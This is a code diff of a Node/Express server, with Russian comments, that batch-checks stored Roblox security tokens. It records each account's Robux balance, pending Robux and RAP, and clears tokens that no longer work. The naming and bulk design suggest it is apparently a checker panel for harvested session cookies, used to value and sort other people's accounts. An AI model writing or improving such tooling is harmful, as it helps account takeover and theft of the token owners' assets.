@@ -827,7 +827,7 @@ app.post('/robux-check', requireAuth, async (req, res) => {
   res.json(info);
 });
 
-// POST /api/tokens-check-batch — быстрая проверка порции токенов (без лимитов и таймаутов)
+// POST /api/tokens-check-batch — быстрая проверка порции токенов (с авто-удалением невалида)
 app.post('/api/tokens-check-batch', requireAuth, async (req, res) => {
   const user = req.authUser || req.session.user;
   const db = await getDb();
@@ -843,28 +843,53 @@ app.post('/api/tokens-check-batch', requireAuth, async (req, res) => {
 
     try {
       const info = await fetchRobuxInfo(security);
-      if (db && info.valid && info.userId) {
-        await db.collection('files').updateOne(
-          { name: filename },
-          { $set: {
-            'robuxInfo.userId': info.userId,
-            'robuxInfo.robux': info.robux,
-            'robuxInfo.pendingRobux': info.pendingRobux || 0,
-            'robuxInfo.rap': info.rap || 0,
-            'robuxInfo.valid': true,
-            'robuxInfo.checked': new Date().toISOString(),
-            'roblox.userId': info.userId,
-            ...(info.username ? { 'roblox.user': info.username } : {})
-          }}
-        );
+      if (info.valid && info.userId) {
+        if (db) {
+          await db.collection('files').updateOne(
+            { name: filename },
+            { $set: {
+              'robuxInfo.userId': info.userId,
+              'robuxInfo.robux': info.robux,
+              'robuxInfo.pendingRobux': info.pendingRobux || 0,
+              'robuxInfo.rap': info.rap || 0,
+              'robuxInfo.valid': true,
+              'robuxInfo.checked': new Date().toISOString(),
+              'roblox.userId': info.userId,
+              ...(info.username ? { 'roblox.user': info.username } : {})
+            }}
+          );
+        }
+        return { file: filename, ...info };
+      } else {
+        // Токен подтверждён как невалидный — очищаем токен из базы
+        if (db) {
+          await db.collection('files').updateOne(
+            { name: filename },
+            { $set: { 'roblox.security': '', 'robuxInfo.valid': false }, $unset: { 'robuxInfo': '' } }
+          );
+        }
+        return { file: filename, valid: false, deleted: true, error: info.error || 'Невалидный токен' };
       }
-      return { file: filename, ...info };
     } catch (e) {
       return { file: filename, valid: false, error: e.message };
     }
   }));
 
   res.json({ results });
+});
+
+// POST /api/tokens-delete-invalid — удаление всех невалидных токенов
+app.post('/api/tokens-delete-invalid', requireAuth, async (req, res) => {
+  const user = req.authUser || req.session.user;
+  const db = await getDb();
+  const { filenames } = req.body;
+  if (Array.isArray(filenames) && filenames.length > 0 && db) {
+    await db.collection('files').updateMany(
+      { name: { $in: filenames } },
+      { $set: { 'roblox.security': '' }, $unset: { 'robuxInfo': '' } }
+    );
+  }
+  res.json({ success: true });
 });
 
 // POST /robux-bulk — быстрая параллельная проверка всех сохранённых токенов (бачинг по 10)
